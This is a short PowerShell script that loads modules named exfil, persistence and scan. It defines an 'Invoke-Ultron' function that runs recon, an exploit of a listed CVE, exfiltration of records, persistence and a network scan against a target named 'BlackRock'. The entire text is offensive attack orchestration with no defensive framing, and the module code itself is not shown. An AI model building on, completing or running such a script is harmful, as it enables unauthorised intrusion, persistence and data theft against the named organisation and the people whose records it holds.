. .\engine\modules\exfil.ps1 
. .\engine\modules\persistence.ps1 
. .\engine\modules\scan.ps1 
function Invoke-Ultron { param($goal) Write-Host "Ultron: Processing $goal" -ForegroundColor Cyan; Invoke-Recon -target "BlackRock"; Invoke-Exploit -target "BlackRock" -vector "CVE-2026-78903"; Invoke-Exfil -target "BlackRock" -dataType "Records"; Invoke-Persistence -target "BlackRock"; Invoke-Scan -range "192.168.1.0/24"; Write-Host "Ultron: Complete" -ForegroundColor Green } 
